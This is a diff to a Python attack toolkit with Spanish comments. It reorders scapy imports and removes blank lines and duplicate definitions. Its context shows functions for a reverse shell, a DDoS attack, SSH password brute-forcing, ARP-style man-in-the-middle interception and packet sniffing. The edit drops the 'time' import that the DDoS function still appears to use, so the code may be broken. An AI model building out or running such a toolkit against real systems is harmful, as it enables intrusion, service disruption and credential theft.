@@ -16,6 +16,7 @@ import netifaces
 import ipaddress
 
 # Librerías de ataque y análisis
+from scapy.all import Raw, send
 import scapy.all as scapy
 from scapy.all import sniff, Raw
 from scapy.layers.http import HTTPRequest
@@ -242,9 +243,6 @@ def reverse_shell(target_ip: str, port: int = 5000) -> None:
     except Exception as e:
         logger.error(f"Error en shell inverso: {str(e)}", exc_info=True)
         raise
-import random
-import time
-from scapy.all import IP, TCP, UDP, ICMP, Raw, send
 
 def ddos_attack(target_ip, port, duration):
     start_time = time.time()
@@ -320,7 +318,6 @@ def ssh_bruteforce(host, username, password_file, port=22):
     logger.info("Fuerza bruta finalizada. No se encontró una contraseña válida.")
     return "[INFO] Fuerza bruta finalizada. No se encontró una contraseña válida."
 
-
 def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None) -> Optional[threading.Event]:
     try:
         iface = interface or scapy.conf.iface
@@ -370,7 +367,6 @@ def mitm_attack(target_ip: str, gateway_ip: str, interface: Optional[str] = None
         print(f"[ERROR] No se pudo iniciar el ataque MITM: {e}")
         return None
 
-logger = logging.getLogger(__name__)
 class PacketSniffer:
     def __init__(self, verbose=False):
         self.verbose = verbose
